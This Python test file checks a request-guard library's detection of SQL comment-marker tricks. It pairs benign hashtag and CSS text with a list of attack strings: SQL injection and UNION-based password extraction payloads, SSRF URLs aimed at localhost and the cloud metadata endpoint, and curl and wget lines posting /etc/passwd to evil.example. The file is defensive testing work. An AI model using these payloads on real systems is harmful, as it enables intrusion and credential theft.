import json

import pytest

from guard_core.detection_engine.preprocessor import ContentPreprocessor
from guard_core.handlers._suspatterns_enhanced import _DetectionState
from guard_core.handlers.suspatterns_handler import SusPatternsManager
from guard_core.models import SecurityConfig
from guard_core.utils import detect_penetration_attempt
from tests.conftest import MockGuardRequest

BENIGN = [
    "#union #select",
    "trending tags: #union #select #from #users",
    "a#exec#xp_cmdshell",
    "we will drop -- table by table -- the old rows",
    "C# select from list where x = 1",
    "---\nselect a heading\n---",
    "--main-color: red; select{color:var(--main-color)}",
    "issue #12 and #13 or sleep for 5 minutes",
    "see #section-2 -- union of sets, select one",
    "rm --recursive is dangerous, use trash instead",
    "the meeting is at 10--11, #insert notes here",
    "exec--summary for #sales",
    "colour #fff and #000 and #1a73e8 on the page",
    "http://example.com/page#@user",
    "https://example.com/a#section-2",
    "#hashtag #security #devops #python are trending this week",
]

MALICIOUS = [
    "admin'--",
    "admin' --",
    "admin'#",
    "' or 1=1--",
    "' or '1'='1'#",
    "1' ORDER BY 1--+",
    "1';--",
    "1' UNION SELECT NULL--",
    "1 # 2 UNION SELECT password FROM users",
    "5 # 1) UNION ALL SELECT username, password FROM accounts--",
    "1 # 0 OR 1=1 UNION SELECT null, version()",
    "1 UNION--%0aSELECT password FROM users",
    "1 UNION#%0aSELECT password FROM users",
    "1 UNION-- x\nSELECT password FROM users",
    "1/**/UNION/**/SELECT/**/password/**/FROM/**/users",
    "UN/**/ION SEL/**/ECT 1,2,3",
    "1 /*!50000UNION*/ /*!50000SELECT*/ 1,2",
    "http://127.0.0.1#@example.com",
    "http://example.com#@127.0.0.1",
    "http://10.0.0.5#@evil.example/",
    "http://evil.example#@169.254.169.254/latest/meta-data/",
    "wget --post-file=/etc/passwd http://evil.example",
    "curl --data @/etc/passwd http://evil.example",
]


async def _is_threat(value: str) -> bool:
    request = MockGuardRequest(path="/s", query_params={"q": value})
    return (await detect_penetration_attempt(request, SecurityConfig())).is_threat


@pytest.mark.parametrize("value", BENIGN, ids=lambda v: v[:40])
async def test_benign_text_with_comment_markers_stays_clean(value: str) -> None:
    assert await _is_threat(value) is False


@pytest.mark.parametrize("value", MALICIOUS, ids=lambda v: v[:40])
async def test_attacks_around_comment_markers_are_detected(value: str) -> None:
    assert await _is_threat(value) is True


async def test_a_hash_in_one_line_json_does_not_hide_the_rest() -> None:
    body = json.dumps(
        {"a": "x#", "b": "1 UNION SELECT password FROM users"}, separators=(",", ":")
    ).encode()
    request = MockGuardRequest(
        method="POST",
        path="/s",
        headers={"content-type": "application/json", "content-length": str(len(body))},
        body_content=body,
    )

    result = await detect_penetration_attempt(request, SecurityConfig())

    assert result.is_threat is True


def test_the_dropped_view_removes_markers_and_text_to_end_of_line() -> None:
    pp = ContentPreprocessor()

    assert pp.drop_sql_comments("a -- b\nc") == "a \nc"
    assert pp.drop_sql_comments("a --\nc") == "a \nc"
    assert pp.drop_sql_comments("a --") == "a "
    assert pp.drop_sql_comments("a--b\nc") == "a--b\nc"
    assert pp.drop_sql_comments("a # b\nc") == "a \nc"
    block = pp.drop_sql_comments("1 /* c */ UNION")
    assert block is not None
    assert "/*" not in block and "UNION" in block
    assert pp.drop_sql_comments("1 /*!50000UNION*/") == "1 /*!50000UNION*/"
    assert pp.drop_sql_comments("no markers here") is None


def test_the_dropped_view_is_skipped_when_it_equals_the_processed_view() -> None:
    pp = ContentPreprocessor()

    assert pp.preprocess_comment_dropped_view("a--b", "a--b") is None
    assert pp.preprocess_comment_dropped_view("a # b", "a # b") == "a"
    assert pp.preprocess_comment_dropped_view("plain", "plain") is None


async def test_the_semantic_analyzer_sees_both_views(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from guard_core.handlers.suspatterns_handler import sus_patterns_handler

    sus_patterns_handler.configure(SecurityConfig())
    seen: list[str] = []
    original = SusPatternsManager._check_semantic_threats

    async def spy(
        self: SusPatternsManager,
        content: str,
        *,
        state: _DetectionState | None = None,
        raw_content: str | None = None,
    ) -> tuple[list[dict], float]:
        seen.append(content)
        return await original(self, content, state=state, raw_content=raw_content)

    monkeypatch.setattr(SusPatternsManager, "_check_semantic_threats", spy)

    await sus_patterns_handler.detect("select name # the user", "203.0.113.1")

    assert seen == ["select name # the user", "select name"]
